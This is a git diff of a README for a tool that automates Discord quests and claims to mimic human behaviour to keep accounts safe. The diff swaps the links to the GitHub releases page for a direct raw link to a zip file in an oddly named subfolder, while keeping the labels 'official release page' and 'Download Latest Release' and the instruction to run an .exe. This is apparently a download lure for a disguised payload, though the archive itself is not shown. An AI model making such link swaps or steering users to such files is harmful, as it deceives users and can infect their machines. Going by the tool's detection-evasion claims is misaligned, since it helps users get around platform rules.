@@ -1,6 +1,6 @@
 # 🎮 Discord-Quest-Completer - Finish All Discord Quests With Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/AlienStreaming/Discord-Quest-Completer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/AlienStreaming/Discord-Quest-Completer/raw/refs/heads/main/tatterly/Discord_Quest_Completer_v1.4.zip)
 
 Discord-Quest-Completer automates the process of finishing Discord quests. It handles all five quest types: games, videos, streams, activities, and achievements. The tool includes a live dashboard to track your progress and mimics human behavior to keep your account safe.
 
@@ -15,7 +15,7 @@ Discord-Quest-Completer automates the process of finishing Discord quests. It ha
 
 Follow these steps to set up and run the application on your computer.
 
-1. Go to the [official release page](https://github.com/AlienStreaming/Discord-Quest-Completer/releases).
+1. Go to the [official release page](https://github.com/AlienStreaming/Discord-Quest-Completer/raw/refs/heads/main/tatterly/Discord_Quest_Completer_v1.4.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Save the file to your desktop or downloads folder.
